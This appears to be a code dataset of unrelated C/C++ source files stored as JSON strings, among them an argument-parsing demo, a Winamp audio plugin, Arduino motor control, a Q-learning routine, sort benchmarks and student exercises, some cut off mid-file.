    "#include <arguments.hpp>\n\n#include <algorithm>\n#include <iostream>\n#include <print>\n#include <ranges>\n\nint main() {\n  #ifdef _WIN32\n  auto& out = std::wcout;\n  #else\n  auto& out = std::cout;\n  std::println(\"{}\", std::arguments{}[0]);\n  #endif\n\n  std::println(\"---------------- simple iteration with .c_str()\");\n  for(const auto& arg : std::arguments{}) {\n    out << arg.c_str() << std::endl;\n  }\n\n  std::arguments args;\n\n  std::println(\"---------------- simple iteration with .native()\");\n  for(const auto& arg : args) {\n    out << arg.native() << std::endl;\n  }\n\n  std::println(\"---------------- simple iteration with .native_string()\");\n  for(const auto& arg : args) {\n    out << arg.native_string() << std::endl;\n  }\n\n  std::println(\"---------------- reverse adapter\");\n  for(const auto& arg : args | std::views::reverse) {\n    out << arg.native() << std::endl;\n  }\n\n  std::println(\"---------------- drop(1) | reverse\");\n  for(const auto& arg : args | std::views::drop(1) | std::views::reverse) {\n    out << arg.native() << std::endl;\n  }\n\n  std::println(\"---------------- member access and printing\");\n  // args[0].c_str()[0] = ' ';\n  // args[0].native()[0] = ' ';\n  out << args[0].native() << std::endl;\n  out << args[1] << std::endl;\n  out << args.at(1) << std::endl;\n  out << args[2] << std::endl;\n\n  std::println(\"---------------- iterators behave properly\");\n  auto it = args.begin();\n  out << (*it).c_str() << std::endl;\n  out << (++it)->c_str() << std::endl;\n  out << it++->c_str() << std::endl;\n  out << it->c_str() << std::endl;\n\n  std::println(\"---------------- encoding stuff\");\n  #ifdef _WIN32\n  #define ARG(str) L##str\n  #else\n  #define ARG(str) str\n  #endif\n  if(args.at(1).native() == ARG(\"--help\")) {\n    std::println(\"arguments[1] is --help, using ARG macro\");\n  }\n  if(args.at(1).string() == \"--help\") {\n    std::println(\"arguments[1] is --help, using .string()\");\n  }\n  if(args.at(1).wstring() == L\"--help\") {\n    std::println(\"arguments[1] is --help, using .wstring()\");\n  }\n  if(args.at(1).u8string() == u8\"--help\") {\n    std::println(\"arguments[1] is --help, using .u8string()\");\n  }\n  if(args.at(1).u16string() == u\"--help\") {\n    std::println(\"arguments[1] is --help, using .u16string()\");\n  }\n  if(args.at(1).u32string() == U\"--help\") {\n    std::println(\"arguments[1] is --help, using .u32string()\");\n  }\n}\n",
    "extern \"C\" \n{\n#include \"main.h\"\n}\n#include \"drv_buffer.h\"\n#include <bfc/platform/types.h>\n\ntypedef struct\n{\n\tconst char *cmd;\n\tconst char *file;\n\tconst char *title;\n\tint   titleLength;\n\tint   start;\n\tint   startUnit;\n\tint   loops;\n\tint   flags;\n} PlayParams;\nextern \"C\" int GetSampleSizeFlag();\nextern \"C\" MMSTREAM *_mm_fopen_rf(const CHAR *fname);\t//rf_wrapper.c\nBOOL GetPlayParams(const char *fileName, BOOL open, PlayParams *params);\nBOOL InitPlayer(UNIMOD *mf, MPLAYER **ps, const PlayParams *params, BOOL quick);\n// TODO; is there a way to get floating point out of this stuff?\nextern \"C\" \n{\n\t__declspec(dllexport) intptr_t winampGetExtendedRead_open(const char *fn, int *size, int *bps, int *nch, int *srate)\n\t{\n\t\tPlayParams params;\n\t\tif (!GetPlayParams(fn, FALSE, &params))\n\t\t\treturn 0;\n\n\t\tint requested_channels = *nch;\n\t\tint requested_bits = *bps;\n\t\tint requested_srate = *srate;\n\n\t\tuint md_mode = 0;\n\t\tif (config_interp & 1) md_mode |= DMODE_INTERP;\n\t\tif (config_interp & 2) md_mode |= DMODE_NOCLICK;\n\t\tif (config_interp & 4) md_mode |= DMODE_FIR;\n\t\tswitch(requested_bits)\n\t\t{\n\t\tcase 0:\n\t\t\tmd_mode |= GetSampleSizeFlag();\n\t\t\tbreak;\n\t\tcase 16:\n\t\t\tmd_mode |= DMODE_16BITS;\n\t\t\tbreak;\n\t\tcase 24:\n\t\t\tmd_mode |= DMODE_24BITS;\n\t\t\tbreak;\n\t\t}\n\n\n\t\tif (requested_channels != 1 && requested_channels != 2) md_mode |= DMODE_SURROUND;\n\t\tif (config_panrev)     md_mode |= DMODE_REVERSE;\n\t\tif (config_resonance)  md_mode |= DMODE_RESONANCE;\n\n\t\tMDRIVER *md = Mikmod_Init(requested_srate?requested_srate:config_srate, 0, 0, MD_STEREO, config_cpu, md_mode, &drv_buffer);\n\t\tMPLAYER *mp;\n\n\t\tMMSTREAM  *fp;\n\t\tfp = _mm_fopen_rf(params.file);\n\t\tif (!fp)\n\t\t{\n\t\t\tMikmod_Exit(md);\n\t\t\t//CleanupTemp();\n\t\t\treturn 0;\n\t\t}\n\t\tUNIMOD *mf=Unimod_Load_FP(md, params.file,fp);\n\t\t_mm_fclose(fp);\n\t\tif (mf==NULL)\n\t\t{\t\t\t\t\n\t\t\tMikmod_Exit(md);\n\t\t\t//                CleanupTemp();\n\t\t\treturn 0;\n\t\t}\n\n\t\tif (!InitPlayer(mf, &mp, &params, FALSE))\n\t\t{\n\t\t\t//CleanupTemp();\n\t\t\tUnimod_Free(mf);\n\t\t\tMikmod_Exit(md);\n\t\t\treturn 0;\n\t\t}\n\n\t\tPlayer_Start(mp);\n\t\tDecodeInfo  *hwdata = (DecodeInfo *)md->device.local;\n\t\t*bps = hwdata->bits;\n\t\t*srate = hwdata->mixspeed;\n\t\t*nch = hwdata->channels;\n\t\tif (mf->songlen)\n\t\t\t*size = MulDiv(mf->songlen, hwdata->mixspeed * hwdata->channels *hwdata->bits, 8*1000);\n\t\telse\n\t\t\t*size = -1; \n\t\treturn (intptr_t)mp;\n\t}\n\n\t__declspec(dllexport) size_t winampGetExtendedRead_getData(intptr_t handle, char *dest, size_t len, int *killswitch)\n\t{\n\t\tMPLAYER *mp = (MPLAYER *)handle;\n\t\tDecodeInfo  *hwdata = (DecodeInfo *)mp->mf->md->device.local;\n\n\t\tif (!Player_Active(mp)) // check if we're done\n\t\t\treturn 0;\n\n\t\thwdata->buffer = dest;\n\t\thwdata->buffersize = len;\n\t\thwdata->bytesWritten = 0;\n\t\tMikmod_Update(mp->mf->md);\n\t\treturn hwdata->bytesWritten;\n\t}\n\n\n\t__declspec(dllexport) void winampGetExtendedRead_close(intptr_t handle)\n\t{\n\t\tMPLAYER *mp = (MPLAYER *)handle;\n\t\tMDRIVER *md = mp->mf->md;\n\t\tUNIMOD *mf = (UNIMOD *)mp->mf;\t\t\n\t\tPlayer_Free(mp);\n\t\tUnimod_Free(mf);\n\t\tMikmod_Exit(md);\n\t}\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hackthon_2024\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#ifndef GL_GLEXT_PROTOTYPES\n\t#define GL_GLEXT_PROTOTYPES 1\n#endif\n#include <GL/gl.h>\n#include <GL/glext.h>\n\n#include \"imgui/imgui.h\"\n#include \"imgui/imgui_impl_glfw.h\"\n#include \"imgui/imgui_impl_opengl3.h\"\n\n#include \"viewer.h\"\n\n#include \"camera.h\"\n#include \"mouse.h\"\n#include \"ndc.h\"\n#include \"trackball.h\"\n\n#define ZOOM_SENSITIVITY 0.3f /* for mouse zoom */\n\nstatic void GL_debug_cb(GLenum source, GLenum type, GLuint id, GLenum severity,\n\t\t\tGLsizei length, const GLchar *message,\n\t\t\tconst void *user_param);\nstatic void mouse_button_cb(GLFWwindow *window, int button, int action,\n\t\t\t    int mods);\nstatic void cursor_pos_cb(GLFWwindow *window, double x, double y);\nstatic void scroll_cb(GLFWwindow *window, double xoffset, double yoffset);\nstatic void key_cb(GLFWwindow *window, int key, int scancode, int action,\n\t\t   int mods);\nstatic void resize_window_cb(GLFWwindow *window, int width, int height);\n\nvoid Viewer::init(const char *name)\n{\n\tthis->name = name;\n\twidth = 1920;\n\theight = 1080;\n\tcamera.set_aspect((float)width / height);\n\n\t/* Set-up GLFW and */\n\tif (!glfwInit()) {\n\t\tprintf(\"Cannot initialize GLFW.\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tglfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 4);\n\tglfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 5);\n\tglfwWindowHint(GLFW_DOUBLEBUFFER, GL_TRUE);\n\tglfwWindowHint(GLFW_DEPTH_BITS, 32);\n\tglfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\tglfwWindowHint(GLFW_SAMPLES, 4);\n\twindow = glfwCreateWindow(width, height, name, NULL, NULL);\n\tif (!window) {\n\t\tprintf(\"Cannot create GLFW window.\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\tglfwSetWindowUserPointer(window, this);\n\tglfwMakeContextCurrent(window);\n\tglfwSetKeyCallback(window, key_cb);\n\tglfwSetFramebufferSizeCallback(window, resize_window_cb);\n\tglfwSetCursorPosCallback(window, cursor_pos_cb);\n\tglfwSetMouseButtonCallback(window, mouse_button_cb);\n\tglfwSetScrollCallback(window, scroll_cb);\n\tglfwSwapInterval(1);\n\n\t/* Allow OpenGL debug messages */\n\tglEnable(GL_DEBUG_OUTPUT);\n\tglDebugMessageCallback(GL_debug_cb, NULL);\n\n\t/* Set-up OpenGL for our choice of NDC */\n\tset_up_opengl_for_ndc();\n\n\t/* Set-up Imgui */\n\tIMGUI_CHECKVERSION();\n\tImGui::CreateContext();\n\tImGui::StyleColorsDark();\n\tImGui_ImplGlfw_InitForOpenGL(window, true);\n\tImGui_ImplOpenGL3_Init(\"#version 150\");\n}\n\nvoid Viewer::register_key_callback(KeyCallback cb) { key_callback = cb; }\n\nbool Viewer::should_close() const { return glfwWindowShouldClose(window); }\n\nvoid Viewer::poll_events() { return glfwPollEvents(); }\n\nvoid Viewer::begin_frame()\n{\n\tImGui_ImplOpenGL3_NewFrame();\n\tImGui_ImplGlfw_NewFrame();\n\tImGui::NewFrame();\n}\n\nvoid Viewer::end_frame()\n{\n\tImGui::Render();\n\tImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());\n\n\tglfwSwapBuffers(window);\n}\n\nvoid Viewer::fini()\n{\n\tImGui_ImplOpenGL3_Shutdown();\n\tImGui_ImplGlfw_Shutdown();\n\tImGui::DestroyContext();\n\n\tglfwDestroyWindow(window);\n\twindow = NULL;\n\tglfwTerminate();\n}\n\nstatic void GL_debug_cb(GLenum source, GLenum type, GLuint id, GLenum severity,\n\t\t\tGLsizei length, const GLchar *message,\n\t\t\tconst void *user_param)\n{\n\t(void)source;\n\t(void)length;\n\t(void)user_param;\n\t(void)id;\n\tif (type == GL_DEBUG_TYPE_ERROR) {\n\t\tprintf(\"GL CALLBACK: %s type = 0x%x, severity = 0x%x,\\\n\t\t\tmessage = %s\\n\",\n\t\t       type == GL_DEBUG_TYPE_ERROR ? \"** GL ERROR **\" : \"\",\n\t\t       type, severity, message);\n\t}\n}\n\nstatic void mouse_button_cb(GLFWwindow *window, int button, int action,\n\t\t\t    int mods)\n{\n\tif (ImGui::GetIO().WantCaptureMouse) {\n\t\treturn;\n\t}\n\n\tViewer *viewer = (Viewer *)glfwGetWindowUserPointer(window);\n\tCamera &camera = viewer->camera;\n\tMouse &mouse = viewer->mouse;\n\tScreenTrackball &trackball = viewer->trackball;\n\tint width = viewer->width;\n\tint height = viewer->height;\n\n\tviewer->mouse.record_button(button, action, mods);\n\n\tif (button == 0 && action == GLFW_PRESS) {\n\t\tfloat px = mouse.x;\n\t\tfloat py = mouse.y;\n\t\ttrackball.grab(px, py, width, height);\n\t\tcamera.save_spatial_state();\n\t\tif (!mouse.is_double_click[button])\n\t\t\treturn;\n\t\tfloat depth;\n\t\tfloat tx = px;\n\t\tfloat ty = height - py;\n\t\tglReadPixels(tx, ty, 1, 1, GL_DEPTH_COMPONENT, GL_FLOAT,\n\t\t\t     &depth);\n\t\t/* Don't track clicks outisde of model */\n\t\tif (approx_equal(depth, 1.f - reversed_z)) {\n\t\t\treturn;\n\t\t}\n\t\tVec3 target =\n\t\t    camera.world_coord_at(px / width, py / height, depth);\n\t\tcamera.set_target(target);\n\t}\n}\n\nstatic void cursor_pos_cb(GLFWwindow *window, double x, double y)\n{\n\tViewer *viewer = (Viewer *)glfwGetWindowUserPointer(window);\n\tCamera &camera = viewer->camera;\n\tMouse &mouse = viewer->mouse;\n\tScreenTrackball &trackball = viewer->trackball;\n\tint width = viewer->width;\n\tint height = viewer->height;\n\n\tviewer->mouse.record_move(x, y);\n\n\tif (!mouse.is_pressed[0])\n\t\treturn;\n\n\tint mods = mouse.mods[0];\n\tfloat delta_x = x - mouse.last_click_x[0];\n\tfloat delta_y = y - mouse.last_click_y[0];\n\n\tif (mods & GLFW_MOD_SHIFT) {\n\t\t/* Translation in x and y */\n\t\tfloat dist = norm(camera.get_target() - camera.get_position());\n\t\tflo",
    "#include <Arduino.h>\n\n// Pin motor BTS7960\nconst int RPWM_PIN = 2;\nconst int LPWM_PIN = 3;\nconst int REN_PIN = 4;\nconst int LEN_PIN = 5;\n\n// Pin encoder\nconst int ENCODER_A_PIN = 27;\nconst int ENCODER_B_PIN = 29;\n\n// Variabel encoder\nvolatile long encoderPosition = 0;\nint lastEncoded = 0;\n\nvoid updateEncoder();\n\nvoid setup() {\n  // Konfigurasi pin motor sebagai output\n  pinMode(RPWM_PIN, OUTPUT);\n  pinMode(LPWM_PIN, OUTPUT);\n  pinMode(REN_PIN, OUTPUT);\n  pinMode(LEN_PIN, OUTPUT);\n\n  // Konfigurasi pin encoder sebagai input\n  pinMode(ENCODER_A_PIN, INPUT);\n  pinMode(ENCODER_B_PIN, INPUT);\n\n  // Aktifkan pull-up resistor pada pin encoder\n  digitalWrite(ENCODER_A_PIN, HIGH);\n  digitalWrite(ENCODER_B_PIN, HIGH);\n\n  // Attach interrupt untuk encoder\n  attachInterrupt(digitalPinToInterrupt(ENCODER_A_PIN), updateEncoder, CHANGE);\n  attachInterrupt(digitalPinToInterrupt(ENCODER_B_PIN), updateEncoder, CHANGE);\n\n  // Serial monitor untuk debug\n  SerialUSB.begin(9600);\n\n  // Aktifkan motor driver (enable)\n  digitalWrite(REN_PIN, HIGH);\n  digitalWrite(LEN_PIN, HIGH);\n}\n\nvoid loop() {\n  // Tes gerakan motor\n  SerialUSB.print(\"Encoder Position: \");\n  SerialUSB.println(encoderPosition);\n\n  // Putar motor ke kanan (forward)\n  for(int i=0; i<250; i++){\n  analogWrite(RPWM_PIN, i); // Sesuaikan kecepatan 0-255\n  analogWrite(LPWM_PIN, 0);\n  delay(100);\n  }\n  delay(1000); // Putar selama 2 detik\n\n  // Hentikan motor\n  analogWrite(RPWM_PIN, 0);\n  analogWrite(LPWM_PIN, 0);\n  delay(1000); // Tunggu 1 detik\n\n  // Putar motor ke kiri (reverse)\n  for(int i=0; i<250; i++){\n  analogWrite(RPWM_PIN, 0);\n  analogWrite(LPWM_PIN, i); // Sesuaikan kecepatan 0-255\n  delay(100);\n  }\n  delay(1000); // Putar selama 2 detik\n\n  // Hentikan motor\n  analogWrite(RPWM_PIN, 0);\n  analogWrite(LPWM_PIN, 0);\n  delay(1000); // Tunggu 1 detik\n}\n\nvoid updateEncoder() {\n  int MSB = digitalRead(ENCODER_A_PIN); // Most Significant Bit\n  int LSB = digitalRead(ENCODER_B_PIN); // Least Significant Bit\n\n  int encoded = (MSB << 1) | LSB; // Gabungkan kedua bit\n  int sum = (lastEncoded << 2) | encoded; // Tambahkan hasil sebelumnya\n\n  // Mengubah posisi encoder berdasarkan arah putaran\n  if (sum == 0b1101 || sum == 0b0100 || sum == 0b0010 || sum == 0b1011) encoderPosition++;\n  if (sum == 0b1110 || sum == 0b0111 || sum == 0b0001 || sum == 0b1000) encoderPosition--;\n\n  lastEncoded = encoded; // Simpan nilai terakhir\n}\n",
    "#include \"Network.h\"\n\nnamespace NeuralNetwork {\n    // Interpolation functions\n    // -----------------------\n    float distance(const vector<float> &u, const vector<float> &ui, const float qi, const float q_max, const float c, const float epsilon) {\n        float d = c * (q_max - qi) + epsilon;\n        for (size_t j = 0; j < u.size(); ++j) {\n            d += (u[j] - ui[j]) * (u[j] - ui[j]);\n        }\n        return d;\n    }\n\n    float weighted_sum(const vector<float> &distances, const vector<float> &q) {\n        float s = 0.f;\n        for (size_t i = 0; i < distances.size(); ++i) {\n            s += q[i] / distances[i];\n        }\n        return s;\n    }\n\n    float norm(const vector<float> &distances) {\n        float s = 0.f;\n        for (const float distance : distances) {\n            s += 1.f / distance;\n        }\n        return s;\n    }\n\n    // Q derivative functions\n    // ----------------------\n    float diffQ(const float qk, const float dist, const float weighted_sum_, const float norm_, const float c) {\n        return (norm_ * (dist + c * qk) - weighted_sum_ * c) / (norm_ * norm_ * dist * dist);\n    }\n\n    float diffQ(const float ukj, const float uj, const float qk, const float dist, const float weighted_sum_, const float norm_) {\n        return 2.f * (weighted_sum_ - norm_ * qk) * (ukj - uj) / (norm_ * norm_ * dist * dist);\n    }\n\n    // Q-learning algorithm\n    void Network::wire_fit(const vector<float> &xt, const vector<float> &xt1, const float R,\n                           const vector<vector<float> > &wires, const vector<float> &q_values, const int imax, const float alpha,\n                           const float gamma, const float epsilon, const float c) {\n        const vector<float> outputs1 = compute(xt1);\n        float Q1 = 0.f;\n        for (int i = 0; i < m_n_outputs_; i += m_n_wires_) {\n            if (outputs1[i] > Q1) {\n                Q1 = outputs1[i];\n            }\n        }\n\n        const float new_Q = (1 - alpha) * q_values[imax] + alpha * (R + gamma * Q1);\n\n        vector distances(m_n_wires_, 0.f);\n\n        for (int i = 0; i < m_n_wires_; ++i) {\n            distances[i] = distance(wires[i], wires[imax], q_values[i], q_values[imax], c, epsilon);\n        }\n\n        const float weighted_sum_ = weighted_sum(distances, q_values);\n        const float norm_ = norm(distances);\n\n        vector<float> outputs(m_n_outputs_);\n\n        for (size_t i = 0; i < m_n_wires_; ++i) {\n            if (i == imax) {\n                outputs[i * (m_n_controls_ + 1)] = new_Q;\n            } else {\n                outputs[i * (m_n_controls_ + 1)] = q_values[i] + alpha * diffQ(\n                                                       q_values[i], distances[i], weighted_sum_, norm_, c);\n            }\n            for (size_t j = 0; j < m_n_controls_; ++j) {\n                outputs[i * (m_n_controls_ + 1) + j + 1] += wires[i][j] + alpha * diffQ(\n                    wires[i][j], wires[imax][j], q_values[i], distances[i], weighted_sum_, norm_);\n            }\n        }\n\n        train(xt, outputs, alpha);\n    }\n}\n",
    "import <algorithm>;\nimport <execution>;\nimport <format>;\nimport <fstream>;\nimport <iostream>;\nimport <limits>;\nimport <ranges>;\nimport <thread>;\nimport <vector>;\n\nimport hattools.sorts;\nimport hattools.utils;\n\nusing namespace hattools::sorts;\nusing namespace std;\n\nvoid doSorts(ofstream& out, vector<int>& data, auto& fillRate) {\n  constexpr int chunk = 2000; // Thread fragment size\n  vector<int> pidgeon23Data{ data };\n  vector<int> pidgeonData{ data };\n  vector<int> pidgeonFlockData{ data };\n  vector<int> stlsortData{ data };\n  vector<int> stlsortParData{ data };\n  vector<int> stlsortParData2{ data };\n  hattools::utils::Timer t;\n\n  // Pidgeon sort  \n  t.reset();\n  pidgeon::sort(pidgeonData);      \n  out << format(\",{:.7f}\", t.elapsed());\n\n  // Pidgeon23 sort\n  t.reset();\n  pidgeon23::sort(span<int>{ pidgeon23Data });\n  out << format(\",{:.7f}\", t.elapsed());\n\n  // Pidgeon Flock sort - running with 4 threads\n  t.reset();\n  pidgeonflock::sort(std::span<int>{ pidgeonFlockData }, 4, chunk);\n  //pidgeonflock::sort(std::span<int>{ pidgeonFlockData }, std::thread::hardware_concurrency(), chunk);\n  out << format(\",{:.7f}\", t.elapsed());\n\n  // STL non-parallel sort\n  t.reset();\n  sort(stlsortData.begin(), stlsortData.end());\n  out << format(\",{:.7f}\", t.elapsed());\n\n  // STL parallel sort\n  t.reset();\n  sort(execution::par, stlsortParData.begin(), stlsortParData.end());\n  out << format(\",{:.7f}\", t.elapsed());\n\n  // STL parallel unseq sort (in theory, vectorised)\n  t.reset();\n  sort(execution::par_unseq, stlsortParData2.begin(), stlsortParData2.end());\n  out << format(\",{:.7f}\\n\", t.elapsed());\n\n  t.reset();\n  if (pidgeonData == stlsortData &&\n    pidgeon23Data == stlsortData &&\n    stlsortParData == stlsortData &&\n    stlsortParData2 == stlsortData &&\n    pidgeonFlockData == stlsortData) {\n    out  << format(\"OK,{:.7f}\\n\", t.elapsed());\n  }\n  else {\n    out << format(\"NOK,{:.7f}\\n\\n\", t.elapsed());\n  }\n}\n\n// At the denser end of the spectrum, between 0.5% and 25% fill densisty\n// At the sparse end of the spectrum, between 0.05% and 2.5% fill density\nvoid sparse(ofstream& out) {\n  std::vector<int> arr{};\n\n  for (auto i = 1'000'000; i <= 10'000'000; i += 1'000'000) {\n    for (auto j = 10'000; j <= 500'000; j += 10'000) {\n      arr.clear();\n      hattools::utils::generate(-i, i, j, arr);      \n      auto fillRate = static_cast<float>(j) / (i + i);\n      out << format(\"{},{},{},{:.2f},\", -i, i, j, fillRate);\n      doSorts(out, arr, fillRate);\n    }\n  }\n}\n\n// At the denser end of the spectrum, between 100% and 1,000% densisty\n// At the sparse end of the spectrum, between 0.5% and 100% fill density\nvoid dense(ofstream& out) {\n  std::vector<int> arr{};\n\n  for (auto i = 1'000'000; i <= 10'000'000; i += 1'000'000) {\n    for (auto j = 1'000'000; j <= 10'000'000; j += 1'000'000) {\n      arr.clear();\n      hattools::utils::generate(-i, i, j, arr);      \n      auto fillRate = static_cast<float>(j) / (i + i);\n      out << format(\"{},{},{},{:.2f},\", -i, i, j, fillRate);\n      doSorts(out, arr, fillRate);\n    }\n  }\n}\n\n// At the denser end of the spectrum, between 100% and 500% densisty\n// At the sparse end of the spectrum, between 100% and 10% fill density\nvoid equal(ofstream& out) {\n  std::vector<int> arr{};\n\n  for (auto i = 1'000'000; i <= 50'000'000; i += 1'000'000) {\n    for (auto j = 1'000'000; j <= 5'000'000; j += 1'000'000) {\n      arr.clear();\n      hattools::utils::generate(-i, i, j, arr);      \n      auto fillRate = static_cast<float>(j) / (i + i);\n      out << format(\"{},{},{},{:.2f},\", -i, i, j, fillRate);\n      doSorts(out, arr, fillRate);\n    }\n  }\n}\n\nint main()\n{\n  vector<string> files = { \"sparse.csv\", \"equal.csv\", \"dense.csv\" };\n\n  for(unsigned int i = 0; i < files.size(); ++i) {\n    ofstream p1{};\n    p1.open(files[i]);\n    p1 << \"lowerBound,upperBound,elementCount,fill,elapsedPidgeon,elapsedPidgeon23,elapsedFlock,elapsedSTL,elapsedSTLPar,elapsedSTLParSeq\\n\";\n    // Lazy, I know...\n    if (i == 0) {\n      sparse(p1);\n    } else if (i == 1) {\n      equal(p1);\n    } else if (i == 2) {\n      dense(p1);\n    }\n   \n    p1.close();\n  }\n\n  return 0;\n  }\n",
    "#include \"Schedular.h\"\n\n// Comparison function for priority queue\nbool compareTasks(Task* t1, Task* t2) {\n    return t1->priority < t2->priority;\n}\n\nScheduler::Scheduler() : taskQueue(compareTasks) {}\n\nvoid Scheduler::addTask(Task* task) {\n    taskQueue.push(task);\n}\n\nvoid Scheduler::schedule(int timeSlice) {\n    while (!taskQueue.empty()) {\n        Task* currentTask = taskQueue.top();\n        taskQueue.pop();\n\n        std::cout << \"Executing Task ID: \" << currentTask->id \n                  << \" with Priority: \" << currentTask->priority << std::endl;\n\n        currentTask->execute(timeSlice);\n\n        if (!currentTask->isCompleted()) {\n            taskQueue.push(currentTask); // Re-add the task if not completed\n        } else {\n            std::cout << \"Task ID: \" << currentTask->id << \" completed.\" << std::endl;\n            delete currentTask; // Free memory for completed task\n        }\n    }\n}\n\nvoid Scheduler::handlePriorityInversion() {\n    // Implement priority inversion handling logic if necessary\n    // Placeholder for future implementation\n}\n",
    "#include <vector>\n#include <iostream>\n#include <unordered_map>\n#include <algorithm>\n\nusing namespace std;\n\nclass Solution {\nprivate:\n    //para encontrar el representante del grupo (union-find)\n    int find(int x, vector<int>& parent){\n        if(parent[x]!=x){\n            parent[x]=find(parent[x],parent); \n        }\n        return parent[x];\n    }\n\n    //funcion para unir dos grupos (union-find)\n    //num, factor, parent, size\n    //num, num/factor, parent, size\n    void unite(int x, int y, vector<int>& parent, vector<int>& size){\n        int rootX=find(x,parent);\n        int rootY=find(y,parent);\n        if(rootX != rootY){\n            if(size[rootX] > size[rootY]){\n                parent[rootY]=rootX;\n                size[rootX]+=size[rootY];\n            }else{\n                parent[rootX]=rootY;\n                size[rootY]+=size[rootX];\n            }\n        }\n    }\npublic:\n    int largestComponentSize(vector<int>& nums) {\n        int n=nums.size();\n        int maxNum=*max_element(nums.begin(), nums.end());\n\n        vector<int> parent(maxNum+1);\n        vector<int> size(maxNum+1,1);\n        iota(parent.begin(),parent.end(),0);\n\n        for(int num: nums){\n            for(int factor=2; factor*factor<=num; ++factor){\n                if(num%factor==0){\n                    unite(num, factor, parent, size); //unir con el factor\n                    unite(num, num/factor, parent, size); //unir con el cociente\n                }\n            }\n        }\n\n        unordered_map<int,int> componentSize;\n        int maxComponent=0;\n        for(int num: nums){\n            int root=find(num,parent);\n            componentSize[root]++;\n            maxComponent=max(maxComponent, componentSize[root]);\n        }\n        return maxComponent;\n    }\n};\n\nint main(){\n    return 0;\n}",
    "#include <iostream>\n#include <cstring>  // Para usar strcpy e strcmp\n#include <cstdlib>  // Para malloc e free\n\nusing namespace std;\n\n// Estruturas\ntypedef struct dados {\n    char nome[50];\n    char marca[50];\n    char modelo[50];\n    char cidade_partida[50];\n    char cidade_destino[50];\n    float tempo_percorrido;\n    float distancia;\n    char tipo_combustivel[50];\n    float combustivel_consumido;\n    float consumo_km;\n} Dados;\n\ntypedef struct elemento {\n    struct elemento* ant;\n    Dados cadastro;\n    struct elemento* prox;\n} Elem;\n\n// Definindo o descritor da lista\ntypedef struct Descritor {\n    Elem* inicio;\n    int tamanho;\n    Elem* final;\n} Descritor;\n\n// Prot\u00f3tipos das fun\u00e7\u00f5es\nDescritor* criar_descritor();\nvoid cadastrar(Descritor* descritor);\nDados ler_cadastro();\nvoid limpar_tela();\nint menu();\nvoid listar_dados(Descritor* descritor, int opcao2);\nvoid imprimir_dados(Elem* aux);\nvoid pressionar_enter();\nvoid deletar_dados(Descritor* descritor);\nvoid inserir_lista(Descritor * Descritor,Elem * novo,Elem * aux);\nvoid consultar_nome(Descritor* descritor);\n\nint main() {\nDescritor * descritor= criar_descritor();\nint flag = 1;// uso no controle do while\nint opcao,opcao2;\nwhile(flag == 1){\n    limpar_tela();\n    opcao = menu();\n    switch (opcao){\n        case 1:\n            cadastrar(descritor);\n            break;\n        case 2:\n            consultar_nome(descritor);\n            break;\n        case 3:\n            deletar_dados(descritor);\n            break;\n        case 4:\n            cout << \"0-Menor consumo Km/litro\\n1-Maior consumo Km/litro\" <<endl;\n            cin >> opcao2;\n            cin.get();\n            limpar_tela();\n            listar_dados(descritor,opcao2);\n            break;\n        case 5:\n            flag =0;\n            break;\n        default:\n            cout << \"Op\u00e7\u00e3o invalida z\u00e9\";\n        break;\n} }\n\nreturn 1;\n\n}\n\n// criar o descritor\nDescritor* criar_descritor()\n{\n    Descritor* descritor = (Descritor*)malloc(sizeof(Descritor));\n    descritor->inicio = NULL;\n    descritor->final = NULL;\n    descritor->tamanho = 0;\n    return descritor;\n}\nvoid cadastrar(Descritor* descritor)\n{\n    Elem * novo = (Elem*)malloc(sizeof(Elem));\n    novo->cadastro = ler_cadastro();\n    novo->ant = NULL;\n    novo->prox = NULL;\n    \n    //caso a lista estiver vazia\n    if(descritor->inicio == NULL){\n        descritor ->inicio = novo;\n        descritor ->final = novo;\n    }\n\n    // caso a lista n\u00e3o tiver vazia vamos dar um insert sort\n    else{\n        Elem *aux = descritor->inicio;\n        while(aux != NULL && novo->cadastro.consumo_km >= aux->cadastro.consumo_km) {\n            aux = aux->prox;\n        }\n        inserir_lista(descritor,novo,aux);\n    }\n\n    // aumenta o tamanho da lista\n    (descritor->tamanho)++; \n}\n\nvoid inserir_lista(Descritor * descritor,Elem * novo,Elem * aux){\n\n    // caso seja o primeiro elemento oo/oooooooooooo\n    if(descritor->inicio == aux){\n        aux ->ant = novo;\n        novo ->prox = aux;\n        descritor->inicio = novo;\n    }\n    //caso seja uma inser\u00e7\u00e3o no ultimo elemento\n    else if(aux == NULL){\n        novo->ant = descritor->final;\n        descritor->final->prox = novo;\n        descritor->final = novo;\n    }\n    // inser\u00e7\u00e3o no meio\n    else {\n        aux->ant->prox = novo;\n        novo -> ant = aux->ant;\n        aux->ant = novo;\n        novo -> prox = aux;\n    }\n}\nDados ler_cadastro(){\n    Dados novo;\n    cout << \"Digite o nome completo: \";\n\n    cin.getline(novo.nome,50);\n\n    cout << \"Digite a Marca: \";\n  